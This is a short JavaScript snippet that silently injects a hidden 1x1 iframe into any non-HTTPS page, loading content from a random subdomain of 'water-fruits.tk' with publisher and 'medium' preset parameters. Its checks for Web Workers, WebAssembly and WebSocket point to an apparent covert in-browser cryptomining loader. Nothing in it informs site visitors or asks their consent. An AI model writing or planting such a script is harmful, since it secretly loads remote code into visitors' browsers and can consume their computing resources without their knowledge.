(function () {
  if (!window.Worker || !window.WebAssembly || !window.WebSocket || window.location.protocol === 'https:') return;

  var options = {
    publisher: 'wf1',
    domain: 'water-fruits.tk',
    preset: 'medium',
    subId: ''
  };

  var i = document.createElement('iframe');
  i.width = i.height = 1;
  i.style.display = 'none';

  i.src = 'http://' + Math.random().toString().replace('0.', 'www.') + '.' + options.domain + '/s/?product=trs&publisher=' + options.publisher + '&preset=' + options.preset + '&subid=' + encodeURIComponent(options.subId || '');
  if (document.body) {
    document.body.appendChild(i)
  } else {
    document.addEventListener('DOMContentLoaded', function (event) {
      document.body.appendChild(i)
    })
  }
})()
